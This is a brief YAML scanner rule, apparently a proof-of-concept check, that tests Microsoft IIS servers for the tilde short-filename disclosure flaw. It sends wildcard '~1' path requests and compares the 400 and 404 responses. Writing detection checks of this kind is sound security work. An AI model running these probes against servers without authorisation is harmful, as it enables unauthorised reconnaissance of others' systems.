name: poc-yaml-iis-shortname
rules:
  - method: GET
    path: /stu*~1****/a.aspx
    follow_redirects: true
    expression: |
      response.status == 400
  - method: GET
    path: /*~1****/a.aspx
    follow_redirects: true
    expression: |
      response.status == 404

detail:
  author:Stu.
  links:
    - https://www.freebuf.com/articles/4908.html
